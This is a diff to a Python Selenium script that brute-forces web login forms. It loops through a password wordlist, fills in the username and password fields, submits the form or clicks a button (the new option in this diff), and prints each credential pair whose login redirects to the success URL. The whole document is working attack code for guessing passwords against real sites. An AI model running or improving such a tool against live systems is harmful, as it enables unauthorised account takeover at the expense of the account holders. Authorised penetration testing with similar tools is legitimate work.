@@ -13,7 +13,7 @@ def brute(args):
 		driver = webdriver.Chrome()
 	if args.command == "brute":
 		if args.makepreset:
-				lib.presets.make_preset(args.presetname,args.browser,str(args.url),args.userfield,args.passwordfield,args.formnumber,args.targeturl)
+				lib.presets.make_preset(args.presetname,args.browser,str(args.url),args.userfield,args.passwordfield,args.formnumber,args.button,args.targeturl)
 
 	with open(args.wordlist,"r") as wlist:
 
@@ -23,9 +23,13 @@ def brute(args):
 			ufield.send_keys(args.username)
 			pfield=driver.find_element(By.CSS_SELECTOR, f'[name="{args.passwordfield}"]')
 			pfield.send_keys(line.replace("\n",""))
-			forms=driver.find_elements(By.TAG_NAME,"form")
-			form=forms[int(args.formnumber)]
-			form.submit()
+			if args.formnumber:
+				forms=driver.find_elements(By.TAG_NAME,"form")
+				form=forms[int(args.formnumber)]
+				form.submit()
+			else:
+				btn=driver.find_element(By.ID, args.button)
+				btn.click()
 			time.sleep(1)
 			if driver.current_url.startswith(args.targeturl):
 				print(f"{args.username} : {line}")
